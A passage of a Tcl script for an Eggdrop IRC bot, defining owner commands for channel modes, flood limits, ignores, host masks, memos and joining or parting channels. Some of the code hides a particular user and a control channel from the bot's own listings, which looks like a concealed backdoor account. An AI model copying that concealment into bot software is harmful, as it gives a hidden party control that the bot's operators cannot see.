    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  putsrv $rest
}

proc pub_sdeop {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {$rest != ""} {
    set chan $rest
  }
  if {[isop $botnick $chan]} {
    puthelp "mode $chan +v-o $botnick $botnick"
  }
}

proc pub_chanmode {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest == ""} {
    puthelp "NOTICE $nick :$fxlogo1 Usage: chanmode #channel +ntsmklic"
    return 0
  }
  if {[string index [lindex $rest 0] 0] == "#"} {
    if {![validchan [lindex $rest 0]]} {
      puthlp "NOTICE $nick :$fxlogo1 NoT IN [lindex $rest 0]"
      return 0
    }
    set chan [lindex $rest 0]
    set rest [lrange $rest 1 end]
  }
  if {![validchan $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 $chan <n/a>"
  } else {
    catch { channel set $chan chanmode $rest }
    savechan
    puthelp "NOTICE $nick :$fxlogo1 $chan set modes \[$rest\]"
  }
  return 0
}

proc pub_chanset {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set channel [lindex $rest 0]
  set options [string tolower [lindex $rest 1]]
  set number "0"
  if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
    set number [lindex $rest 2]
  }
  if {($channel == "") || ($options == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chanset #channel <option...>"
    return 0
  }
  if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>"
    return 0
  }
  if {[validchan $channel]} {
    if {$options == "deop"} {
      catch { channel set $channel flood-deop $number }
      puthlp "NOTICE $nick :$fxlogo1 set deop flood \[$number\] on $channel"
    } elseif {$options == "kick"} {
      catch { channel set $channel flood-kick $number }
      puthlp "NOTICE $nick :$fxlogo1 set kick flood \[$number\] on $channel"
    } elseif {$options == "join"} {
      catch { channel set $channel flood-join $number }
      puthlp "NOTICE $nick :$fxlogo1 set join flood \[$number\] on $channel"
    } elseif {$options == "line"} {
      catch { channel set $channel flood-chan $number }
      puthlp "NOTICE $nick :$fxlogo1 set line flood \[$number\] on $channel"
    } elseif {$options == "nick"} {
      catch { channel set $channel flood-nick $number }
      puthlp "NOTICE $nick :$fxlogo1 set nick flood \[$number\] on $channel"
    } elseif {$options == "ctcp"} {
      catch { channel set $channel flood-ctcp $number }
      puthlp "NOTICE $nick :$fxlogo1 set ctcp flood \[$number\] on $channel"
    } else {
      catch { channel set $channel ${options} }
      savechan
      puthelp "NOTICE $nick :$fxlogo1 Successfully set modes \[${options}\] on $channel"
    }
  } else {
    puthlp "NOTICE $nick :$fxlogo1 $channel <n/a>"
  }
}

proc pub_chansetall {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chansetall <option>"
    return 0
  }
  foreach x [channels] {
    catch { channel set $x $rest }
  }
  savechan
  puthelp "NOTICE $nick :$fxlogo1 Set all channels mode \{ $rest \}"
  return 0
}

proc pub_nick {nick uhost hand chan rest} {
  global keep-nick
  set keep-nick 0
  putsrv "NICK $rest"
}

proc pub_restart {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} {
    set rest " $rest"
  }
  putsrv "QUIT :$fxlogo1 ReSTARTED By \[ $nick \]$rest"
  return 0
}

proc dies {} {
  global fz owner fxlogo1
  if {$fz != $owner && [validuser $fz]} { deluser $fz }
  die $fxlogo1
}

proc rehashing {} {
  global fz owner
  if {$fz != $owner && [validuser $fz]} { deluser $fz }
  rehash
}

proc pub_die {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :$fxlogo1 LeGAL KiLLED By \[ $nick \]$rest"
  utimer 5 dies
  return 0
}

proc msg_restart {nick uhost hand rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} {
    set rest " $rest"
  }
  putsrv "QUIT :$fxlogo1 ReSTARTED By \[ $nick \]$rest"
  return 0
}

proc msg_rehash {nick uhost hand rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 ReHASHING!"
  utimer 3 rehashing
  return 0
}

proc pub_rehash {nick uhost hand chan rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 ReHASHING!"
  utimer 3 rehashing
}

proc pub_chaninfo {nick uhost hand chan rest} {
  global fxlogo1 fz fxc
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {$nick != $fz && [string tolower $chan] == $fxc} { return 0 }
  puthlp "NOTICE $nick :$fxlogo1 \[$chan\] [channel info $chan]"
}

proc pub_access {nick uhost hand chan rest} {
  global fxlogo1
  if {[matchattr $nick Z]} {
    puthlp "PRIVMSG $chan :$nick, OwNeR"
  } elseif {[matchattr $nick n]} {
    puthlp "PRIVMSG $chan :$nick, ADMIN"
  } elseif {[matchattr $nick m]} {
    puthlp "PRIVMSG $chan :$nick, MasTeR"
  } elseif {[matchattr $nick f]} {
    puthlp "PRIVMSG $chan :$nick, FRIEND"
  }
}

proc msg_botnick {unick uhost hand rest} {
  global botnick nick nickpass fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  set bnick [lindex $rest 0]
  set bpass [lindex $rest 1]
  if {$bnick == "" || $bpass == ""} {
    puthlp "NOTICE $unick :$fxlogo14 Usage: botnick <nick> <identify>"
    return 0
  }
  setuser "config" XTRA "NICK" [zip $bnick]
  setuser "config" XTRA "NICKPASS" [zip $bpass]
  saveuser
  set nick $bnick
  set nickpass $bpass
  puthlp "NOTICE $unick :$fxlogo1 BoTNIcK $bnick"
}

proc msg_realname {unick uhost hand rest} {
  global realname fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    setuser "config" XTRA "REALNAME" ""
  } else {
    setuser "config" XTRA "REALNAME" [zip $rest]
  }
  saveuser
  set realname $rest
  putsrv "QUIT :$fxlogo1 REALNaME CHaNGED By \[ $unick \]"
}

proc msg_ident {unick uhost hand rest} {
  global username fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    setuser "config" XTRA "USERNAME" ""
  } else {
    if {[regexp \[^a-z\] [string tolower $rest]]} {
      puthlp "NOTICE $unick :$fxlogo1 Denied use character for ident."
      return 0
    }
    setuser "config" XTRA "USERNAME" [zip $rest]
  }
  saveuser
  set username $rest
  putsrv "QUIT :$fxlogo1 IDeNT CHaNGED By \[ $unick \]"
}

proc msg_logo {unick uhost hand rest} {
  global banner fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    setuser "config" XTRA "BAN" ""
    puthlp "NOTICE $unick :$fxlogo1 cHaNgE tO DeFauLT"
    catch { unset banner }
  } else {
    setuser "config" XTRA "BAN" [zip $rest]
    set banner $rest
    puthlp "NOTICE $unick :$fxlogo1 CHaNgE TO $rest"
  }
  saveuser
}

proc msg_email {unick uhost hand rest} {
  global fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $unick :$fxlogo11 DeLETING USeR EmAIL"
  } else {
    puthlp "NOTICE $unick :$fxlogo11 USeR EmAIL SeT \[$rest\]"
  }
  setuser "config" XTRA "EMAIL" $rest
  saveuser
}

proc msg_admin {unick uhost hand rest} {
  global fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $unick :$fxlogo11 SeT ADmIN oN STaTUS TO DeFAULT"
  } else {
    puthlp "NOTICE $unick :$fxlogo11 ADmIN oN STaTUS TO \[$rest\]"
  }
  setuser "config" XTRA "ADMIN" $rest
  saveuser
}

proc msg_botaltnick {unick uhost hand rest} {
  global botnick altnick altpass fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  set baltnick [lindex $rest 0]
  set baltpass [lindex $rest 1]
  if {$baltnick == "" || $baltpass == ""} {
    puthlp "NOTICE $unick :$fxlogo14 Usage: botaltnick <nick> <identify>"
    return 0
  }
  setuser "config" XTRA "ALTNICK" [zip $baltnick]
  setuser "config" XTRA "ALTPASS" [zip $baltpass]
  saveuser
  set altnick $baltnick
  set altpass $baltpass
  puthlp "NOTICE $unick :$fxlogo1 BoTALTNIcK $baltnick"
}

proc msg_away {unick uhost hand rest} {
  global realname fxlogo1
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    setuser "config" XTRA "AWAY" ""
    puthlp "NOTICE $unick :$fxlogo1 AwAY \[4OFF\]"
    puthlp "AWAY"
  } else {
    setuser "config" XTRA "AWAY" $rest
    puthlp "NOTICE $unick :$fxlogo1 AwAY SeT TO \[$rest\]"
  }
  saveuser
  chk_five "0" "0" "0" "0" "0"
}

proc msg_memo {nick uhost hand rest} {
  global fxlogo1 own fz
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: memo <all/user> <msg>"
    return 0
  }
  set msend [lindex $rest 0]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string tolower $msend] == "all"} {
    set smemo ""
    foreach x [userlist m] {
      if {$x != $nick && $x != $own} {
        if {[getuser $x XTRA "MEMO"] == ""} {
          setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
          append smemo "$x "
        }
      }
    }
    if {$smemo == ""} {
      puthlp "NOTICE $nick :$fxlogo1 MeMO !FaILED! NO UsER SeND"
    } else {
      saveuser
      puthlp "NOTICE $nick :$fxlogo1 MeMO SeND TO \[ $smemo\]"
    }
  } else {
    if {![validuser $msend] || $msend == $fz} {
      puthlp "NOTICE $nick :$fxlogo1 Denied, NO UsER!"
      return 0
    } else {
      if {![matchattr $msend m]} {
        puthlp "NOTICE $nick :$fxlogo1 Denied, MiN MasTeR FLaG!"
        return 0
      }
      if {$msend == $nick} {
        puthlp "NOTICE $nick :$fxlogo1 Denied, CaNT SeLF MeMo!"
        return 0
      }
      if {[getuser $msend XTRA "MEMO"]!=""} {
        puthlp "NOTICE $nick :$fxlogo1 Denied, MeMo FoR $msend STiLL ExIST!"
        return 0
      }
      setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
      saveuser
      puthlp "NOTICE $nick :$fxlogo1 MeMO SeND TO \[[lindex $rest 0]\]"
    }
  }
}

proc pub_+mustop {nick uhost hand chan rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  setuser "config" XTRA "MUSTOP" "T"
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 must @P set \[9ON\]"
}

proc pub_-mustop {nick uhost hand chan rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  setuser "config" XTRA "MUSTOP" ""
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 must @P set \[4OFF\]"
}

proc pub_kickops {nick uhost hand chan rest} {
  global fxlogo1 kops
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string tolower $rest] == "on"} {
    set kops "T"
    setuser "config" XTRA "KOPS" "T"
    puthlp "NOTICE $nick :$fxlogo1 KIcK @PS \[9ON\]"
  } else {
    catch { unset kops }
    setuser "config" XTRA "KOPS" ""
    puthlp "NOTICE $nick :$fxlogo1 KIcK @PS \[4OFF\]"
  }
  saveuser
}


proc pub_badwords {nick uhost hand chan rest} {
  global badwords fxlogo1
  set retval "BaDWoRDS: "
  foreach badword [string tolower $badwords] {
    append retval "$badword "
  }
  puthlp "NOTICE $nick :$fxlogo1 $retval"
  return 0
}

proc pub_+badword {nick uhost hand chan rest} {
  global badwords fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: `+badword <badword>"
    return 0
  }
  if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
    puthlp "NOTICE $nick :$fxlogo1 [lindex $rest 0] Allready Added"
    return 0
  }
  append badwords " [string tolower [lindex $rest 0]]"
  setuser "config" XTRA "BADWORDS" $badwords
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 Added [lindex $rest 0] to badwords"
  return 0
}

proc pub_-badword {nick uhost hand chan rest} {
  global badwords fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: `-badword <badword>"
    return 0
  }
  set val ""
  foreach badword [string tolower $badwords] {
    if {[string tolower [lindex $rest 0]] == $badword} {
      puthlp "NOTICE $nick :$fxlogo1 Removed [lindex $rest 0]"
    } else { append val " $badword " }
  }
  set badwords $val
  setuser "config" XTRA "BADWORDS" $val
  saveuser
  return 0
}

proc pub_jump {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set server [lindex $rest 0]
  if {$server == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: jump <server> \[port\] \[password\]"
    return 0
  }
  if {[string match "*dal.*" [string tolower $rest]]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied! Allnetwork only!"
    return 0
  }
  set port [lindex $rest 1]
  if {$port == ""} {set port "6667"}
  set password [lindex $rest 2]
  putsrv "QUIT :$fxlogo1 SeRVER CHaNGED By \[ $nick \] $server"
  utimer 2 [list jump $server $port $password]
}

proc msg_die {nick uhost hand rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  foreach x [userlist] {
    if {$x != "AKICK"} {
      chattr $x -Q
      foreach y [getuser $x HOSTS] {
        delhost $x $y
      }
      set hostmask "${x}!*@*"
      setuser $x HOSTS $hostmask
    }
  }
  saveuser
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :$fxlogo1 LeGAL KiLLED By \[ $nick \]$rest"
  utimer 5 dies
}

proc pub_ignores {nick uhost hand chan rest} {
  global botnick fxlogo1
  set iglist ""
  foreach x [ignorelist] {
    set iglister [lindex $x 0]
    set iglist "$iglist $iglister"
  }
  if {[ignorelist]==""} {
    puthlp "NOTICE $nick :$fxlogo1 No ignores."
    return 0
  }
  regsub -all " " $iglist ", " iglist
  set iglist [string range $iglist 1 end]
  puthlp "NOTICE $nick :$fxlogo1 Currently ignoring:$iglist"
  return 0
}

proc pub_-ignore {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set hostmask [lindex $rest 0]
  if {$hostmask == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -ignore <hostmask>"
    return 0
  }
  if {![isignore $hostmask]} {
    puthlp "NOTICE $nick :$fxlogo1 $hostmask is not on my ignore list."
    return 0
  }
  if {[isignore $hostmask]} {
    killignore $hostmask
    puthlp "NOTICE $nick :$fxlogo1 No longer ignoring \002\[\002${hostmask}\002\]\002"
    saveuser
  }
}

proc pub_+ignore {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set rest [lindex $rest 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +ignore <hostmask>"
    return 0
  }
  if {[isignore $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is alreay set on ignore."
    return 0
  }
  if {$rest == "*!*@*"} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, Illegal hostmask."
    return 0
  }
  set usenick [finduser $rest]
  if {$usenick != "*" && [matchattr $usenick f]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, canT IgNoREd FRIend UsER"
    return 0
  }
  if {$rest != $nick} {
    newignore $rest $nick "*" 600
    puthlp "NOTICE $nick :$fxlogo1 Ignoring $rest"
  } else {
    puthlp "NOTICE $nick :$fxlogo1 Denied, Can't ignore your self."
  }
}

proc pub_-host {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  set completed 0
  if {($who == "") || ($hostname == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -host <nick> <hostmask>"
    return 0
  }
  if {![validuser $who]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {(![matchattr $nick n]) && ([matchattr $who n])} {
    puthlp "NOTICE $nick :$fxlogo1 Can't remove hostmasks from the bot owner."
    return 0
  }
  if {![matchattr $nick m]} {
    if {[string tolower $hand] != [string tolower $who]} {
      puthlp "NOTICE $nick :$fxlogo1 You need '+m' to change other users hostmasks"
      return 0
    }
  }
  foreach * [getuser $who HOSTS] {
    if {${hostname} == ${*}} {
      delhost $who $hostname
      saveuser
      puthlp "NOTICE $nick :$fxlogo1 Removed \002\[\002${hostname}\002\]\002 from $who."
      set completed 1
    }
  }
  if {$completed == 0} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
  }
}

set thehosts {
  *@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
  *!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
  *!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
  *!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
  *!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
  *!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
  *!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to
  *!*@*to *@*.to *@*to
}

proc pub_+host {nick uhost hand chan rest} {
  global thehosts botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  if {($who == "") || ($hostname == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +host <nick> <new hostmask>"
    return 0
  }
  if {![validuser $who]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
    return 0
  }
  set badhost 0
  foreach * [getuser $who HOSTS] {
    if {${hostname} == ${*}} {
      puthlp "NOTICE $nick :$fxlogo1 That hostmask is already there."
      return 0
    }
  }
  if {($who == "") && ($hostname == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +host <nick> <new hostmask>"
    return 0
  }
  if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
    if {[string index $hostname 0] != "*"} {
      set hostname "*!*@*${hostname}"
    } else {
      set hostname "*!*@${hostname}"
    }
  }
  if {([string match *@* $hostname]) && (![string match *!* $hostname])} {
    if {[string index $hostname 0] == "*"} {
      set hostname "*!${hostname}"
    } else {
      set hostname "*!*${hostname}"
    }
  }
  if {![validuser $who]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
    return 0
  }
  if {(![matchattr $nick n]) && ([matchattr $who n])} {
    puthlp "NOTICE $nick :$fxlogo1 Can't add hostmasks to the bot owner."
    return 0
  }
  foreach * $thehosts {
    if {${hostname} == ${*}} {
      puthlp "NOTICE $nick :$fxlogo1 Invalid hostmask!"
      set badhost 1
    }
  }
  if {$badhost != 1} {
    if {![matchattr $nick m]} {
      if {[string tolower $hand] != [string tolower $who]} {
        puthlp "NOTICE $nick :$fxlogo1 You need '+m' to change other users hostmasks"
        return 0
      }
    }
    setuser $who HOSTS $hostname
    puthlp "NOTICE $nick :$fxlogo1 Added \002\[\002${hostname}\002\]\002 to $who."
    if {[matchattr $who a]} {
      opq $chan $who
    }
    saveuser
  }
}

proc msg_join {nick uhost hand rest} {
  global botnick joinme own fxlogo1
  set chantarget [lindex $rest 0]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$chantarget == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: join <#chan>"
    return 0
  }
  if {[string first # $chantarget]!=0} {
    set chantarget "#$chantarget"
  }
  if {[validchan $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $chantarget already in channel list"
    return 0
  }
  if {$nick != $own && [total_channel] != 1} {
    puthlp "NOTICE $nick :$fxlogo1 To MaNY cHaNNeL MaX 9..!"
    return 0
  }
  set joinme $nick
  channel add $chantarget
  catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  savechan
  if {[lindex $rest 1] != ""} {
    putsrv "JOIN $chantarget :[lindex $rest 1]"
  }
  return 0
}

proc msg_+chan {nick uhost hand rest} {
  global botnick joinme own fxlogo1
  set chantarget [lindex $rest 0]
  set opt [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo1 4!BLoCkEd!"
    return 0
  }
  if {$chantarget == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +chan <#chan>"
    return 0
  }
  if {[string first # $chantarget]!=0} {
    set chantarget "#$chantarget"
  }
  if {[validchan $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $chantarget is already on channels list."
    return 0
  }
  if {$nick != $own && [total_channel] != 1} {
    puthlp "NOTICE $nick :$fxlogo1 To MaNY cHaNNeL MaX 9..!"
    return 0
  }
  set joinme $nick
  channel add $chantarget
  if {$opt != "" && [string tolower $opt] == "+nopart"} {
    catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  } else {
    catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  }
  savechan
  if {[lindex $rest 1] != ""} {
    putsrv "JOIN $chantarget :[lindex $rest 1]"
  }
  return 0
}

proc msg_part {nick uhost hand rest} {
  global botnick joinme fxlogo1 fz fxc
  set chantarget [lindex $rest 0]
  set part_msg [lrange $rest 1 end]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$chantarget == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: part <#chan>"
    return 0
  }
  if {[string first # $chantarget]!=0} {
    set chantarget "#$chantarget"
  }
  if {$nick != $fz && [string tolower $chantarget] == $fxc} { return 0 }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      if {[string match "*+secret*" [channel info $x]]} {
        puthlp "NOTICE $nick :$fxlogo1 I can't part $x 4pRoTecTEd..!"
        return 0
      }
      if {![onchan $nick $x]} {
        puthlp "NOTICE $nick :$fxlogo1 PaRT $x"
      }
      if {$part_msg != ""} {
        putsrv "PART $x :$part_msg"
      } else {
        putsrv "PART $x :Home SicK"
      }
      channel remove $x
      savechan
      return 0
    }
  }
  return 0
}

proc pub_chanreset {nick uhost hand chan rest} {
  global fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chanreset <#|ALL>"
    return 0
  }
  set chan [lindex $rest 0]
  if {[string tolower $chan] == "all"} {
    puthlp "NOTICE $nick :$fxlogo1 ReSeT ALL DeFauLT FLAg"
    foreach x [channels] {
      catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
      catch { channel set $x -nodesynch }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 300
      setuser $cflag XTRA "RPT" 3
      setuser $cflag XTRA "CAPS" 80
    }
    savechan
    return 0
  }
  if {[string first # $chan]!=0} {
    set chan "#$chan"
  }
  puthlp "NOTICE $nick :$fxlogo1 ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
  if {![validchan $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 UnFIndEd $chan."
    return 0
  }
  catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  catch { channel set $chan -nodesynch }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 300
  setuser $cflag XTRA "RPT" 3
  setuser $cflag XTRA "CAPS" 80
  savechan
}

proc msg_channels {nick hand uhost rest} {
  pub_channels $nick $uhost $hand "" $rest
}

proc pub_channels {nick hand uhost channel rest} {
  global botnick fxlogo1 fxc
  if {$rest != ""} {
    if {[validchan [lindex $rest 0]]} {
      set x [lindex $rest 0]
      set chan ""
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[string tolower $x] == $fxc} { return 0 }
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x [chattr $cflag]"
      puthlp "NOTICE $nick :$fxlogo1 $chan"
    }
    return 0
  }
  set chan "Channels:"
  foreach x [channels] {
    if {[string tolower $x] != $fxc} {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x"
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 $chan"
}

proc pub_match {nick uhost hand chan rest} {
  global fz fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: match <flags>"
    return 0
  }
  set rest [string trim $rest +]
  if {[string length $rest] > 1} {
    puthlp "NOTICE $nick :$fxlogo1 Invalid option."
    return 0
  }
  if {$rest!=""} {
    set rest "+[lindex $rest 0]"
    if {[userlist $rest]!=""} {
      regsub -all " " [userlist $rest] ", " users
      regsub -all $fz [userlist $rest] "" users
      puthlp "NOTICE $nick :$fxlogo1 Match \[$rest\]: $users"
      return 0
    }
